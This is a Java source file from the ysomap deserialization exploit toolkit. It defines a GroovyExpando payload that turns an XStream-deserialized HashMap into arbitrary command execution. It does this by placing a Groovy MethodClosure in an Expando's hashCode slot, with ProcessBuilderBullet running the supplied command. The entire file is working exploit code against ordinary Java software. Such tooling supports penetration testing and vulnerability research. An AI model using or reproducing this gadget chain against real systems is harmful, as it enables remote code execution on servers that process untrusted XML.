package ysomap.core.payload.xml;

import groovy.util.Expando;
import org.codehaus.groovy.runtime.MethodClosure;
import ysomap.common.annotation.Authors;
import ysomap.common.annotation.Dependencies;
import ysomap.common.annotation.Payloads;
import ysomap.common.annotation.Require;
import ysomap.core.bean.Bullet;
import ysomap.core.bean.Payload;
import ysomap.core.bullet.jdk.ProcessBuilderBullet;
import ysomap.core.serializer.Serializer;
import ysomap.core.serializer.SerializerFactory;
import ysomap.core.util.PayloadHelper;
import ysomap.core.util.ReflectionHelper;

import java.util.HashMap;

/**
 * @author wh1t3P1g
 * @since 2020/4/18
 */
@Payloads
@SuppressWarnings({"rawtypes", "unchecked"})
@Authors({ Authors.WH1T3P1G })
@Dependencies({"Gadget For XStream","org.codehaus.groovy:groovy:2.4.3"})
@Require(bullets = {"JdbcRowSetImplBullet", "ProcessBuilderBullet"})
public class GroovyExpando extends Payload<Object> {
    @Override
    public Serializer<?> getSerializer() {
        return SerializerFactory.createSerializer("xstream");
    }

    @Override
    public Bullet getDefaultBullet(String command) throws Exception {
        return new ProcessBuilderBullet().set("command",command);
    }

    @Override
    public Object pack(Object obj) throws Exception {
        String action = bullet.get("action");
        MethodClosure methodClosure = new MethodClosure(obj, action);
        Expando expando = new Expando();
        HashMap map = new HashMap<>();
        map.put("hashCode", methodClosure);
        ReflectionHelper.setFieldValue(expando, "expandoProperties", map);

        return PayloadHelper.makeMap("foo",expando);
    }
}
